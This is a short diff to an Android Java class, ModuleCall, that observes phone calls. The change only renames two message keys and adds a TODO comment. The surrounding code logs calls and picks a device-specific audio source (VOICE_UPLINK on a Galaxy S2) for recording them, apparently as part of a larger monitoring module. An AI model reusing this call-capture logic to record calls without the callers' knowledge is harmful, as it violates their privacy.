@@ -294,8 +294,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		final String name = ""; //$NON-NLS-1$
 		final boolean missed = false;
-		final String nametype = Messages.getString("7.0"); //$NON-NLS-1$
-		final String note = Messages.getString("7.1"); //$NON-NLS-1$
+		final String nametype = Messages.getString("7_0"); //$NON-NLS-1$
+		final String note = Messages.getString("7_1"); //$NON-NLS-1$
 
 		final int LOG_CALLIST_VERSION = 0;
 
@@ -333,7 +333,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (isSupported): phone model: " + model); //$NON-NLS-1$
 		}
-		
+		// TODO: in Messages
 		if (model.contains("i9100")) { // Samsung Galaxy S2
 			supported = true;
 			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
